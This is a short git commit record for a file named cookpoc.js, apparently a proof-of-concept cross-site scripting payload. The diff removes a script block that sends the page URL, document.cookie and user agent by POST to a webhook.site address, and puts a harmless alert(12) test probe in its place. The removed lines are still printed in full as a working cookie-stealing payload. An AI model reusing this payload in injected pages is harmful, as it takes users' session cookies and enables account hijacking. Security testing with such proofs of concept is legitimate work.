295bc0668d32ed8cd6d225f2d5a3b238c8e1c661
CriThicK <crithick@proton.me>
2026-06-21 12:19:36 +0200

    Update cookpoc.js

--- cookpoc.js
+++ cookpoc.js
@@ -1,10 +1,3 @@
 <script>
-fetch("https://webhook.site/3ba54176-c9e2-4a19-9e45-905ec0f200d9", {
-  method: "POST",
-  body: JSON.stringify({
-    url: location.href,
-    cookies: document.cookie,
-    userAgent: navigator.userAgent
-  })
-});
+alert(12)
 </script>
